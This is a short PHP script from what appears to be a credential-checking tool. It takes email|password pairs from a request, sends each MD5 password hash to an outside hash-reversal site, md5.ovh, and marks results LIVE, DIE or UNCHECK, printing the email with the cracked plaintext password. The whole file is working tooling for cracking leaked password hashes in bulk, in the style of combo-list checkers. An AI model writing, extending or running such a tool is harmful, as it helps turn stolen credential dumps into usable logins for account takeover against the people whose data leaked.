<?php
/*
	1: NOTICE
	-1: UNCHECK
	2: DIE
	3: BAD/SOCKS DIE
	0: LIVE
*/
date_default_timezone_set("Asia/Jakarta");
// function
require_once 'includes/class_curl.php';

// info data
$empass = $_REQUEST['mailpass'];
if (!isset($empass)) {
	header('location: ./');
	exit;
}
$delim = $_REQUEST['delim'];
//$timeout = 10;
list($email,$pwd) = explode($delim, $empass);
$result = array();

// info curl
$cookie = "cookies/".md5($email.'|'.$pwd)."_pp.txt";
/* $curl = new curl();
$curl->cookies($cookie);
if ($sock) $curl->socks($sock);
$curl->ssl(0,2); */

$page = curl("https://www.md5.ovh/index.php?controler=Md5_decrypt&md5={$pwd}","",$cookie); //API
if (in_string($page,"Not found")) {
  $result["error"] = 2;
  $result["msg"] = ''.$email.'|'.$pwd.'&#13;';
} else if (in_string($page,"value decrypted")) {
  $info["name"] = ''.fetch_value($page,'value decrypted:','<br>');
  $result["error"] = 0;
  $live = '<b style="color:green">LIVE</b> | '.$email.'|'.implode(" | ",$info).'';
  $result["msg"] = $live;
} else {
  $result["error"] = -1;
  $result["msg"] = '<b style="color:gold">UNCHECK</b> | '.$email.' | '.$pwd;
}

echo json_encode($result);
@unlink($cookie);

//$curl->close();
?>

<!-- TODOS LOS DERECHOS RESERVADOS POR MAININDEX 2017 | https://github.com/joaqhoc/ | http://main-index.vzpla.net/ -->